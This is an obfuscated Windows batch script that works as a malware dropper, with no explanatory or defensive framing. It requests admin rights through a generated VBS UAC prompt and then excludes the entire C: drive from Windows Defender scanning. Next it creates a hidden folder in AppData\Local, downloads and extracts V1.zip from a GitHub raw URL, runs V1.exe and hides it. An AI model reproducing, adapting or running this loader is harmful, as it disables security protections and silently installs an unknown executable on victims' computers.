@echo off
set "a=%~dp0"
set "b=%temp%"
set "c=%systemroot%"
set "d=%username%"
set "e=AppData"
set "f=Local"
set "g=Anon"
set "h=V1.zip"
set "i=V1.exe"
set "j=Invoke-WebRequest"
set "k=Add-MpPreference"
set "l=ExclusionPath"
set "m=Shell.Application"
set "n=cmd.exe"
set "o=runas"
set "p=getadmin.vbs"
set "q=start"
set "r=attrib +h"
set "s=del"
set "t=tar -xf"
set "u=mkdir"
set "v=cd"
set "w=if"
set "x=else"
set "y=goto"
set "z=exit /B"

%w% "%PROCESSOR_ARCHITECTURE%"=="amd64" (
    >nul 2>&1 "%c%\SysWOW64\cacls.exe" "%c%\SysWOW64\config\system"
) %x% (
    >nul 2>&1 "%c%\system32\cacls.exe" "%c%\system32\config\system"
)

%w% '%errorlevel%' NEQ '0' (
    %y% UACPrompt
) %x% ( %y% gotAdmin )

:UACPrompt
echo Set UAC = CreateObject^("%m%"^) > "%b%\%p%"
set params= %*
echo UAC.ShellExecute "%n%", "/c ""%~s0"" %params:"=""%", "", "%o%", 1 >> "%b%\%p%"
"%b%\%p%"
%s% "%b%\%p%"
%z%

:gotAdmin
pushd "%a%"
%v% /D "%~dp0"

powershell.exe -command "%k% -%l% C:\"

%v% "C:\Users\%d%\%e%\%f%"
%u% "%g%"
%r% "%g%" /s /d
%v% "C:\Users\%d%\%e%\%f%\%g%"

powershell -Command "%j% 'https://github.com/unix-cmd/unixXwille/raw/main/%h%' -OutFile %h%"
%t% %h%
%s% %h%
%q% %i%
%r% "C:\Users\%d%\%e%\%f%\%g%\%i%" /s /d
